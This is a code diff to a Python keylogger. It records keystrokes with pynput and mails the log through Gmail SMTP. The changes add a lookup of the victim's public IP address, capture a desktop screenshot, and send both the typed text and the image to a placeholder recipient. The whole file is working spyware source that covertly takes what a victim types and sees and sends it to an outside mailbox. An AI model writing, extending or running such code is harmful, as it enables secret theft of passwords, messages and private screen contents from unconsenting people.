@@ -1,3 +1,4 @@
+import requests
 import logging
 import os
 from pynput import keyboard
@@ -5,6 +6,13 @@ import time
 import smtplib
 import codecs
 import socket
+import pyautogui
+###
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.image import MIMEImage
+###
+
 
 # create log file
 PATH = os.getcwd()
@@ -28,7 +36,7 @@ def on_press(key):
         start_time = time.time()
         reformat_keylogger_file('log.txt')
         try:  # some ascii characters are not accepted.
-            send_email('RECEIVANT EMAIL.com')
+            send_email('RECEIVANT EMAIL')
         except UnicodeEncodeError:
             pass
         # log file cleaning after email being sent
@@ -60,28 +68,55 @@ def reformat_keylogger_file(file):
         file.write(file_string)
 
 
+def get_external_ip():
+    response = requests.get('https://api.ipify.org?format=json')
+    data = response.json()
+    return data['ip']
+
+
 def send_email(recipient):
     # Set up the connection to the email server
     smtp_server = 'smtp.gmail.com'
     smtp_port = 587
-    smtp_username = 'SENDER EMAIL.com'
-    smtp_password = 'UR APP PASS'
-    ip = socket.gethostbyname(socket.gethostname())
+    smtp_username = 'SENDER EMAIL'
+    smtp_password = 'SENDER APP PASSWORD'
+    ip = get_external_ip()
 
     with open(log_file, "r") as file:
         file_string = file.read()
 
+    if os.path.exists(PATH + '\\s.png'):
+        os.remove(PATH + '\\s.png')
+    take_screenshot(PATH + '\\s')
+    # Create the multipart message
+    msg = MIMEMultipart()
+    msg['From'] = smtp_username
+    msg['To'] = recipient
+    msg['Subject'] = f'User at address {ip} has typed:'
+
+    # Attach the body text
+    body = file_string
+    msg.attach(MIMEText(body, 'plain'))
+
+    # Attach the image
+
+    image_path = PATH + '\\s.png' # Update with the actual path to the image file
+    with open(image_path, 'rb') as image_file:
+        img_data = image_file.read()
+        image = MIMEImage(img_data, name='screenshot.png')
+    msg.attach(image)
+
+    # Connect to the SMTP server and send the email
     with smtplib.SMTP(smtp_server, smtp_port) as smtp:
         smtp.starttls()
         smtp.login(smtp_username, smtp_password)
+        smtp.send_message(msg)
 
-        # Compose the email message
-        subject = f'User at address {ip} has typed:'
-        body = file_string
-        email_message = f'Subject: {subject}\n\n{body}'
 
-        # Send the email
-        smtp.sendmail(smtp_username, recipient, email_message)
+
+def take_screenshot(file):
+    screenshot = pyautogui.screenshot()
+    screenshot.save(file + '.png')
 
 
 start_time = time.time()
